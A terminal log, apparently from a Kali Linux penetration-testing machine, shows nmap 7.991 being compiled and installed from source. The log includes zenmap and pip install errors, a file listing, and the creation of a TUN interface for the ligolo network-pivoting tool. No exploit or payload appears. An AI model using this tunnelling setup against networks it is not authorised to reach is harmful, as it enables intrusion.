+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcre'
+make[3]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+/usr/bin/python3: No module named build.__main__; 'build' is a package and cannot be directly executed
+/usr/bin/python3: No module named build.__main__; 'build' is a package and cannot be directly executed
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/ncat'
+gcc -MM -I./../liblua  -I../libpcap -DHAVE_CONFIG_H -DNCAT_DATADIR="\"/home/kali/Downloads/nmap7-r/share/ncat\"" -D_FORTIFY_SOURCE=2 -I. -I.. -I../nsock/include/ -I../nbase ncat_main.c ncat_connect.c ncat_core.c ncat_posix.c ncat_listen.c ncat_proxy.c ncat_ssl.c base64.c http.c util.c sys_wrap.c ncat_lua.c > makefile.dep
+make: *** [Makefile:355: build-zenmap] Error 1
+make: *** Waiting for unfinished jobs....
+make: *** [Makefile:374: build-ndiff] Error 1
+Making all in dnet
+make[4]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include/dnet'
+make[4]: Nothing to be done for 'all'.
+make[4]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include/dnet'
+make[4]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make[4]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make[3]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+Making all in src
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/src'
+make[2]: Nothing to be done for 'all'.
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/src'
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+make[2]: Nothing to be done for 'all-am'.
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+gcc -I./../liblua  -I../libpcap -DHAVE_CONFIG_H -DNCAT_DATADIR="\"/home/kali/Downloads/nmap7-r/share/ncat\"" -D_FORTIFY_SOURCE=2 -I. -I.. -I../nsock/include/ -I../nbase -DLUA_USE_POSIX -DLUA_USE_DLOPEN -DHAVE_LUA=1 -I../liblua -g -O2 -Wall -c ncat_main.c -o ncat_main.o
+gcc -I./../liblua  -I../libpcap -DHAVE_CONFIG_H -DNCAT_DATADIR="\"/home/kali/Downloads/nmap7-r/share/ncat\"" -D_FORTIFY_SOURCE=2 -I. -I.. -I../nsock/include/ -I../nbase -DLUA_USE_POSIX -DLUA_USE_DLOPEN -DHAVE_LUA=1 -I../liblua -g -O2 -Wall -c ncat_connect.c -o ncat_connect.o
+gcc -I./../liblua  -I../libpcap -DHAVE_CONFIG_H -DNCAT_DATADIR="\"/home/kali/Downloads/nmap7-r/share/ncat\"" -D_FORTIFY_SOURCE=2 -I. -I.. -I../nsock/include/ -I../nbase -DLUA_USE_POSIX -DLUA_USE_DLOPEN -DHAVE_LUA=1 -I../liblua -g -O2 -Wall -c ncat_core.c -o ncat_core.o
+Compiling liblua
+gcc -I./../liblua  -I../libpcap -DHAVE_CONFIG_H -DNCAT_DATADIR="\"/home/kali/Downloads/nmap7-r/share/ncat\"" -D_FORTIFY_SOURCE=2 -I. -I.. -I../nsock/include/ -I../nbase -DLUA_USE_POSIX -DLUA_USE_DLOPEN -DHAVE_LUA=1 -I../liblua -g -O2 -Wall -c ncat_posix.c -o ncat_posix.o
+gcc -I./../liblua  -I../libpcap -DHAVE_CONFIG_H -DNCAT_DATADIR="\"/home/kali/Downloads/nmap7-r/share/ncat\"" -D_FORTIFY_SOURCE=2 -I. -I.. -I../nsock/include/ -I../nbase -DLUA_USE_POSIX -DLUA_USE_DLOPEN -DHAVE_LUA=1 -I../liblua -g -O2 -Wall -c ncat_listen.c -o ncat_listen.o
+gcc -I./../liblua  -I../libpcap -DHAVE_CONFIG_H -DNCAT_DATADIR="\"/home/kali/Downloads/nmap7-r/share/ncat\"" -D_FORTIFY_SOURCE=2 -I. -I.. -I../nsock/include/ -I../nbase -DLUA_USE_POSIX -DLUA_USE_DLOPEN -DHAVE_LUA=1 -I../liblua -g -O2 -Wall -c ncat_proxy.c -o ncat_proxy.o
+gcc -I./../liblua  -I../libpcap -DHAVE_CONFIG_H -DNCAT_DATADIR="\"/home/kali/Downloads/nmap7-r/share/ncat\"" -D_FORTIFY_SOURCE=2 -I. -I.. -I../nsock/include/ -I../nbase -DLUA_USE_POSIX -DLUA_USE_DLOPEN -DHAVE_LUA=1 -I../liblua -g -O2 -Wall -c ncat_ssl.c -o ncat_ssl.o
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/liblua'
+make[2]: 'liblua.a' is up to date.
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/liblua'
+gcc -I./../liblua  -I../libpcap -DHAVE_CONFIG_H -DNCAT_DATADIR="\"/home/kali/Downloads/nmap7-r/share/ncat\"" -D_FORTIFY_SOURCE=2 -I. -I.. -I../nsock/include/ -I../nbase -DLUA_USE_POSIX -DLUA_USE_DLOPEN -DHAVE_LUA=1 -I../liblua -g -O2 -Wall -c base64.c -o base64.o
+gcc -I./../liblua  -I../libpcap -DHAVE_CONFIG_H -DNCAT_DATADIR="\"/home/kali/Downloads/nmap7-r/share/ncat\"" -D_FORTIFY_SOURCE=2 -I. -I.. -I../nsock/include/ -I../nbase -DLUA_USE_POSIX -DLUA_USE_DLOPEN -DHAVE_LUA=1 -I../liblua -g -O2 -Wall -c http.c -o http.o
+gcc -I./../liblua  -I../libpcap -DHAVE_CONFIG_H -DNCAT_DATADIR="\"/home/kali/Downloads/nmap7-r/share/ncat\"" -D_FORTIFY_SOURCE=2 -I. -I.. -I../nsock/include/ -I../nbase -DLUA_USE_POSIX -DLUA_USE_DLOPEN -DHAVE_LUA=1 -I../liblua -g -O2 -Wall -c util.c -o util.o
+gcc -I./../liblua  -I../libpcap -DHAVE_CONFIG_H -DNCAT_DATADIR="\"/home/kali/Downloads/nmap7-r/share/ncat\"" -D_FORTIFY_SOURCE=2 -I. -I.. -I../nsock/include/ -I../nbase -DLUA_USE_POSIX -DLUA_USE_DLOPEN -DHAVE_LUA=1 -I../liblua -g -O2 -Wall -c sys_wrap.c -o sys_wrap.o
+gcc -I./../liblua  -I../libpcap -DHAVE_CONFIG_H -DNCAT_DATADIR="\"/home/kali/Downloads/nmap7-r/share/ncat\"" -D_FORTIFY_SOURCE=2 -I. -I.. -I../nsock/include/ -I../nbase -DLUA_USE_POSIX -DLUA_USE_DLOPEN -DHAVE_LUA=1 -I../liblua -g -O2 -Wall -c ncat_lua.c -o ncat_lua.o
+gcc -o ncat -g -O2 -Wall  -L../libpcap  ncat_main.o ncat_connect.o ncat_core.o ncat_posix.o ncat_listen.o ncat_proxy.o ncat_ssl.o base64.o http.o util.o sys_wrap.o ncat_lua.o ../nsock/src/libnsock.a ../nbase/libnbase.a  -lpcap ./../liblua/liblua.a -lm 
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/ncat'
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/nmap-7.991]
+└─$ make -j"$(nproc)"
+Compiling libnetutil
+cd libnetutil && make
+Compiling liblinear
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/liblinear'
+Compiling libpcap
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libnetutil'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libnetutil'
+make[1]: 'liblinear.a' is up to date.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/liblinear'
+Compiling libpcre
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libpcap'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcap'
+Compiling libnbase
+cd nbase && make
+Compiling libdnet
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/nbase'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/nbase'
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libpcre'
+make  all-am
+Compiling liblua
+/usr/bin/python3 -m build zenmap/
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/liblua'
+make[1]: 'liblua.a' is up to date.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/liblua'
+/usr/bin/python3 -m build ndiff/
+Making all in include
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libpcre'
+Compiling libnsock
+cd nsock/src && make
+make  all-recursive
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcre'
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcre'
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/nsock/src'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/nsock/src'
+make[3]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+/usr/bin/python3: No module named build.__main__; 'build' is a package and cannot be directly executed
+cd ncat && make
+make: *** [Makefile:355: build-zenmap] Error 1
+make: *** Waiting for unfinished jobs....
+Making all in dnet
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/ncat'
+/usr/bin/python3: No module named build.__main__; 'build' is a package and cannot be directly executed
+Compiling liblua
+make[4]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include/dnet'
+make[4]: Nothing to be done for 'all'.
+make[4]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include/dnet'
+make: *** [Makefile:374: build-ndiff] Error 1
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/liblua'
+make[2]: 'liblua.a' is up to date.
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/liblua'
+make[4]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/ncat'
+make[4]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make[3]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+Making all in src
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/src'
+make[2]: Nothing to be done for 'all'.
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/src'
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+make[2]: Nothing to be done for 'all-am'.
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/nmap-7.991]
+└─$ make install     
+Compiling libnetutil
+cd libnetutil && make
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libnetutil'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libnetutil'
+Compiling liblinear
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/liblinear'
+make[1]: 'liblinear.a' is up to date.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/liblinear'
+Compiling libpcap
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libpcap'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcap'
+Compiling libpcre
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libpcre'
+make  all-am
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libpcre'
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcre'
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libpcre'
+Compiling libnbase
+cd nbase && make
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/nbase'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/nbase'
+Compiling libnsock
+cd nsock/src && make
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/nsock/src'
+make[1]: Nothing to be done for 'all'.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/nsock/src'
+Compiling libdnet
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+Making all in include
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make  all-recursive
+make[3]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+Making all in dnet
+make[4]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include/dnet'
+make[4]: Nothing to be done for 'all'.
+make[4]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include/dnet'
+make[4]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make[4]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make[3]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/include'
+Making all in src
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/src'
+make[2]: Nothing to be done for 'all'.
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped/src'
+make[2]: Entering directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+make[2]: Nothing to be done for 'all-am'.
+make[2]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/libdnet-stripped'
+Compiling liblua
+make[1]: Entering directory '/home/kali/Downloads/nmap-7.991/liblua'
+make[1]: 'liblua.a' is up to date.
+make[1]: Leaving directory '/home/kali/Downloads/nmap-7.991/liblua'
+Compiling nmap
+rm -f nmap
+g++ -Wl,-E  -L./nbase -L./nsock/src/   -o nmap charpool.o FingerPrintResults.o FPEngine.o FPModel.o idle_scan.o MACLookup.o nmap_dns.o nmap_error.o nmap.o nmap_ftp.o NmapOps.o NmapOutputTable.o nmap_tty.o osscan2.o osscan.o output.o payload.o portlist.o portreasons.o protocols.o scan_engine.o scan_engine_connect.o scan_engine_raw.o scan_lists.o service_scan.o services.o string_pool.o NewTargets.o TargetGroup.o Target.o targets.o tcpip.o timing.o traceroute.o utils.o xml.o nse_main.o nse_utility.o nse_nsock.o nse_db.o nse_dnet.o nse_fs.o nse_nmaplib.o nse_debug.o nse_lpeg.o nse_zlib.o main.o ./libnetutil/libnetutil.a -lnsock -lnbase ./libpcre/.libs/libpcre2-8.a \./libpcap/libpcap.a   -lz ./libdnet-stripped/src/.libs/libdnet.a ./liblua/liblua.a ./liblinear/liblinear.a 
+mkdir -p /home/kali/Downloads/nmap7-r/bin /home/kali/Downloads/nmap7-r/share/man/man1 /home/kali/Downloads/nmap7-r/share/nmap
+/usr/bin/install -c -c -m 755 nmap /home/kali/Downloads/nmap7-r/bin/nmap
+/usr/bin/strip -x /home/kali/Downloads/nmap7-r/bin/nmap
+/usr/bin/install -c -c -m 644 docs/nmap.1 /home/kali/Downloads/nmap7-r/share/man/man1/
+if [ "yes" = "yes" ]; then \
+  for ll in de es fr hr hu it ja pl pt_BR pt_PT ro ru sk zh; do \
+    mkdir -p /home/kali/Downloads/nmap7-r/share/man/$ll/man1; \
+    /usr/bin/install -c -c -m 644 docs/man-xlate/nmap-$ll.1 /home/kali/Downloads/nmap7-r/share/man/$ll/man1/nmap.1; \
+  done; \
+fi
+/usr/bin/install -c -c -m 644 docs/nmap.xsl /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 docs/nmap.dtd /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 nmap-services /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 nmap-rpc /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 nmap-os-db /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 nmap-service-probes /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 nmap-protocols /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 nmap-mac-prefixes /home/kali/Downloads/nmap7-r/share/nmap/
+mkdir -p /home/kali/Downloads/nmap7-r/share/nmap/scripts
+mkdir -p /home/kali/Downloads/nmap7-r/share/nmap/nselib
+(cd /home/kali/Downloads/nmap7-r/share/nmap/scripts && rm -f anonFTP.nse ASN.nse asn-to-prefix.nse brutePOP3.nse bruteTelnet.nse chargenTest.nse daytimeTest.nse dns-safe-recursion-port.nse dns-safe-recursion-txid.nse dns-test-open-recursion.nse domino-enum-passwords.nse echoTest.nse ftpbounce.nse HTTPAuth.nse HTTP_open_proxy.nse HTTPpasswd.nse HTTPtrace.nse iax2Detect.nse ircServerInfo.nse ircZombieTest.nse mac-geolocation.nse MSSQLm.nse MySQLinfo.nse netbios-smb-os-discovery.nse nfs-acls.nse nfs-dirlist.nse popcapa.nse PPTPversion.nse promiscuous.nse RealVNC_auth_bypass.nse ripeQuery.nse robots.nse showHTMLTitle.nse showHTTPVersion.nse showOwner.nse showSMTPVersion.nse showSSHVersion.nse skype_v2-version.nse smb-enumdomains.nse smb-enumsessions.nse smb-enumshares.nse smb-enumusers.nse smb-serverstats.nse smb-systeminfo.nse SMTPcommands.nse SMTP_openrelay_test.nse smtp-check-vulns.nse SNMPcommunitybrute.nse SNMPsysdescr.nse SQLInject.nse SSH-hostkey.nse SSHv1-support.nse SSLv2-support.nse strangeSMTPport.nse UPnP-info.nse xamppDefaultPass.nse zoneTrans.nse db2-info.nse db2-brute.nse html-title.nse robots.txt.nse xmpp.nse sql-injection.nse http-robtex-reverse-ip.nse http-vuln-zimbra-lfi.nse http-vuln-0-day-lfi-zimbra.nse whois.nse db2-discover.nse http-crossdomainxml.nse http-email-harvest.nse http-wordpress-plugins.nse http-wp-plugins.nse smb-check-vulns.nse)
+/usr/bin/install -c -c -m 644 nse_main.lua /home/kali/Downloads/nmap7-r/share/nmap/
+/usr/bin/install -c -c -m 644 scripts/script.db scripts/*.nse /home/kali/Downloads/nmap7-r/share/nmap/scripts
+/usr/bin/install -c -c -m 644 nselib/*.lua nselib/*.luadoc /home/kali/Downloads/nmap7-r/share/nmap/nselib
+mkdir -p /home/kali/Downloads/nmap7-r/share/nmap/nselib/data
+for f in `find nselib/data -name .svn -prune -o -type d -print`; do \
+        mkdir -p /home/kali/Downloads/nmap7-r/share/nmap/$f; \
+done
+for f in `find nselib/data -name .svn -prune -o -type f -print`; do \
+        /usr/bin/install -c -c -m 644 $f /home/kali/Downloads/nmap7-r/share/nmap/$f; \
+done
+mkdir -p /home/kali/Downloads/nmap7-r/bin /home/kali/Downloads/nmap7-r/share/man/man1 /home/kali/Downloads/nmap7-r/share/applications
+/usr/bin/python3 -m pip install zenmap/ 
+error: externally-managed-environment
+
+× This environment is externally managed
+╰─> To install Python packages system-wide, try apt install
+    python3-xyz, where xyz is the package you are trying to
+    install.
+    
+    If you wish to install a non-Kali-packaged Python package,
+    create a virtual environment using python3 -m venv path/to/venv.
+    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
+    sure you have pypy3-venv installed.
+    
+    If you wish to install a non-Kali-packaged Python application,
+    it may be easiest to use pipx install xyz, which will manage a
+    virtual environment for you. Make sure you have pipx installed.
+    
+    For more information, refer to the following:
+    * https://www.kali.org/docs/general-use/python3-external-packages/
+    * /usr/share/doc/python3.13/README.venv
+
+note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
+hint: See PEP 668 for the detailed specification.
+make: *** [Makefile:359: install-zenmap] Error 1
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/nmap-7.991]
+└─$ sudo ip tuntap add user 0xb0b mode tun ligolo
+invalid user "0xb0b"
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/nmap-7.991]
+└─$ sudo ip tuntap add user kali mode tun ligolo
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/Downloads/nmap-7.991]
+└─$ ls -al
+total 66440
+drwxrwxr-x 23 kali kali    12288 Oct  6 01:17 .
+drwxr-xr-x  6 kali kali     4096 Oct  6 01:11 ..
+-rw-r--r--  1 kali kali     3533 Aug  5 15:12 acinclude.m4
+-rw-r--r--  1 kali kali    11453 Aug  5 15:12 aclocal.m4
+-rw-r--r--  1 kali kali      125 Aug  5 15:12 BSDmakefile
+-rw-r--r--  1 kali kali   799129 Aug  5 15:12 CHANGELOG
+-rw-r--r--  1 kali kali     5130 Aug  5 15:12 charpool.cc
+-rw-r--r--  1 kali kali     4123 Aug  5 15:12 charpool.h
+-rw-rw-r--  1 kali kali    95480 Oct  6 01:15 charpool.o
+-rw-r--r--  1 kali kali     3846 Aug  5 15:12 checklibs.sh
+-rw-r--r--  1 kali kali    42938 Aug  5 15:12 config.guess
+-rw-rw-r--  1 kali kali    75979 Oct  6 01:15 config.log
+-rwxrwxr-x  1 kali kali    31502 Oct  6 01:14 config.status
+-rw-r--r--  1 kali kali    35994 Aug  5 15:12 config.sub
+-rwxr-xr-x  1 kali kali   259080 Aug  5 15:12 configure
+-rw-r--r--  1 kali kali    32204 Aug  5 15:12 configure.ac
+-rw-r--r--  1 kali kali     2662 Aug  5 15:12 CONTRIBUTING.md
+-rw-r--r--  1 kali kali    17574 Aug  5 15:12 depcomp
+drwxrwxr-x  5 kali kali     4096 Aug  5 15:12 docs
+-rw-r--r--  1 kali kali    10872 Aug  5 15:12 FingerPrintResults.cc
+-rw-r--r--  1 kali kali     7859 Aug  5 15:12 FingerPrintResults.h
+-rw-rw-r--  1 kali kali   492912 Oct  6 01:15 FingerPrintResults.o
+-rw-r--r--  1 kali kali   103634 Aug  5 15:12 FPEngine.cc
+-rw-r--r--  1 kali kali    16464 Aug  5 15:12 FPEngine.h
+-rw-rw-r--  1 kali kali  1501136 Oct  6 01:15 FPEngine.o
+-rw-r--r--  1 kali kali  2840309 Aug  5 15:12 FPModel.cc
+-rw-r--r--  1 kali kali      200 Aug  5 15:12 FPModel.h
+-rw-rw-r--  1 kali kali  1850152 Oct  6 01:15 FPModel.o
+drwxrwxr-x  4 kali kali     4096 Aug  5 15:12 .github
+-rw-r--r--  1 kali kali     2296 Aug  5 15:12 .gitignore
+-rw-r--r--  1 kali kali     4086 Aug  5 15:12 HACKING
+-rw-r--r--  1 kali kali    56298 Aug  5 15:12 idle_scan.cc
+-rw-r--r--  1 kali kali     4178 Aug  5 15:12 idle_scan.h
+-rw-rw-r--  1 kali kali   712208 Oct  6 01:15 idle_scan.o
+-rw-r--r--  1 kali kali      211 Aug  5 15:12 INSTALL
+-rw-r--r--  1 kali kali      584 Aug  5 15:12 .lgtm.yml
+drwxrwxr-x  7 kali kali     4096 Oct  6 01:15 libdnet-stripped
+drwxrwxr-x  3 kali kali     4096 Oct  6 01:15 liblinear
+drwxrwxr-x  2 kali kali     4096 Oct  6 01:15 liblua
+drwxrwxr-x  2 kali kali     4096 Oct  6 01:15 libnetutil
+drwxrwxr-x  9 kali kali    12288 Oct  6 01:15 libpcap
+drwxrwxr-x  7 kali kali     4096 Oct  6 01:15 libpcre
+drwxrwxr-x 10 kali kali     4096 Aug  5 15:12 libssh2
+drwxrwxr-x 12 kali kali     4096 Aug  5 15:12 libz
+-rw-r--r--  1 kali kali    29575 Aug  5 15:12 LICENSE
+-rw-r--r--  1 kali kali   104167 Aug  5 15:12 lpeg.c
+-rw-r--r--  1 kali kali   243268 Aug  5 15:12 ltmain.sh
+-rw-r--r--  1 kali kali     9095 Aug  5 15:12 MACLookup.cc
+-rw-r--r--  1 kali kali     4286 Aug  5 15:12 MACLookup.h
+-rw-rw-r--  1 kali kali   461184 Oct  6 01:15 MACLookup.o
+drwxrwxr-x  4 kali kali     4096 Aug  5 15:12 macosx
+-rw-r--r--  1 kali kali     7459 Aug  5 15:12 main.cc
+-rw-rw-r--  1 kali kali   209120 Oct  6 01:15 main.o
+-rw-rw-r--  1 kali kali    19112 Oct  6 01:14 Makefile
+-rw-rw-r--  1 kali kali    49266 Oct  6 01:15 makefile.dep
+-rw-r--r--  1 kali kali    18967 Aug  5 15:12 Makefile.in
+-rw-r--r--  1 kali kali    10677 Aug  5 15:12 missing
+drwxrwxr-x  6 kali kali     4096 Aug  5 15:12 mswin32
+drwxrwxr-x  3 kali kali     4096 Oct  6 01:15 nbase
+drwxrwxr-x  6 kali kali     4096 Oct  6 01:16 ncat
+drwxrwxr-x  5 kali kali     4096 Aug  5 15:12 ndiff
+-rw-r--r--  1 kali kali     5943 Aug  5 15:12 NewTargets.cc
+-rw-r--r--  1 kali kali     4460 Aug  5 15:12 NewTargets.h
+-rw-rw-r--  1 kali kali   577664 Oct  6 01:15 NewTargets.o
+-rwxrwxr-x  1 kali kali 18502440 Oct  6 01:17 nmap
+-rw-r--r--  1 kali kali     4513 Aug  5 15:12 nmap-7.991-1.spec
+-rw-r--r--  1 kali kali     4856 Aug  5 15:12 nmap_amigaos.h
+-rw-r--r--  1 kali kali   114497 Aug  5 15:12 nmap.cc
+-rw-rw-r--  1 kali kali     5656 Oct  6 01:14 nmap_config.h
+-rw-r--r--  1 kali kali     5294 Aug  5 15:12 nmap_config.h.in
+-rw-r--r--  1 kali kali     6759 Aug  5 15:12 nmap_dns.cc
+-rw-r--r--  1 kali kali     3645 Aug  5 15:12 nmap_dns.h
+-rw-rw-r--  1 kali kali   704600 Oct  6 01:15 nmap_dns.o
+-rw-r--r--  1 kali kali     7342 Aug  5 15:12 nmap_error.cc
+-rw-r--r--  1 kali kali     4178 Aug  5 15:12 nmap_error.h
+-rw-rw-r--  1 kali kali    35952 Oct  6 01:15 nmap_error.o
+-rw-r--r--  1 kali kali    13437 Aug  5 15:12 nmap_ftp.cc
+-rw-r--r--  1 kali kali     4463 Aug  5 15:12 nmap_ftp.h
+-rw-rw-r--  1 kali kali   610144 Oct  6 01:15 nmap_ftp.o
+-rw-r--r--  1 kali kali    10009 Aug  5 15:12 nmap.h
+-rw-r--r--  1 kali kali  1375622 Aug  5 15:12 nmap-mac-prefixes
+-rw-rw-r--  1 kali kali  1918416 Oct  6 01:15 nmap.o
+-rw-r--r--  1 kali kali    21337 Aug  5 15:12 NmapOps.cc
+-rw-r--r--  1 kali kali    15411 Aug  5 15:12 NmapOps.h
+-rw-rw-r--  1 kali kali   668968 Oct  6 01:15 NmapOps.o
+-rw-r--r--  1 kali kali  5368132 Aug  5 15:12 nmap-os-db
+-rw-r--r--  1 kali kali     8899 Aug  5 15:12 NmapOutputTable.cc
+-rw-r--r--  1 kali kali     6560 Aug  5 15:12 NmapOutputTable.h
+-rw-rw-r--  1 kali kali    43976 Oct  6 01:15 NmapOutputTable.o
+-rw-r--r--  1 kali kali     6963 Aug  5 15:12 nmap-protocols
+-rw-r--r--  1 kali kali    44030 Aug  5 15:12 nmap-rpc
+-rw-r--r--  1 kali kali  2579553 Aug  5 15:12 nmap-service-probes
+-rw-r--r--  1 kali kali   998268 Aug  5 15:12 nmap-services
+-rw-r--r--  1 kali kali    10462 Aug  5 15:12 nmap_tty.cc
+-rw-r--r--  1 kali kali     4082 Aug  5 15:12 nmap_tty.h
+-rw-rw-r--  1 kali kali   220216 Oct  6 01:15 nmap_tty.o
+-rw-r--r--  1 kali kali     4196 Aug  5 15:12 nmap_winconfig.h
+drwxrwxr-x  3 kali kali     4096 Oct  6 01:14 nping
+-rw-r--r--  1 kali kali     2491 Aug  5 15:12 nse_db.cc
+-rw-r--r--  1 kali kali      112 Aug  5 15:12 nse_db.h
+-rw-rw-r--  1 kali kali    23272 Oct  6 01:15 nse_db.o
+-rw-r--r--  1 kali kali     2325 Aug  5 15:12 nse_debug.cc
+-rw-r--r--  1 kali kali      167 Aug  5 15:12 nse_debug.h
+-rw-rw-r--  1 kali kali    42320 Oct  6 01:15 nse_debug.o
+-rw-r--r--  1 kali kali    12482 Aug  5 15:12 nse_dnet.cc
+-rw-r--r--  1 kali kali      102 Aug  5 15:12 nse_dnet.h
+-rw-rw-r--  1 kali kali   253032 Oct  6 01:15 nse_dnet.o
+-rw-r--r--  1 kali kali     6730 Aug  5 15:12 nse_fs.cc
+-rw-r--r--  1 kali kali      108 Aug  5 15:12 nse_fs.h
+-rw-rw-r--  1 kali kali    42312 Oct  6 01:15 nse_fs.o
+drwxrwxr-x  3 kali kali     4096 Aug  5 15:12 nselib
+-rw-r--r--  1 kali kali    32780 Aug  5 15:12 nse_libssh2.cc
+-rw-r--r--  1 kali kali      111 Aug  5 15:12 nse_libssh2.h
+-rw-r--r--  1 kali kali      473 Aug  5 15:12 nse_lpeg.cc
+-rw-r--r--  1 kali kali      107 Aug  5 15:12 nse_lpeg.h
+-rw-rw-r--  1 kali kali   310568 Oct  6 01:15 nse_lpeg.o
+-rw-r--r--  1 kali kali      752 Aug  5 15:12 nse_lua.h
+-rw-r--r--  1 kali kali    23726 Aug  5 15:12 nse_main.cc
+-rw-r--r--  1 kali kali     1671 Aug  5 15:12 nse_main.h
+-rw-r--r--  1 kali kali    49982 Aug  5 15:12 nse_main.lua
+-rw-rw-r--  1 kali kali   911392 Oct  6 01:15 nse_main.o
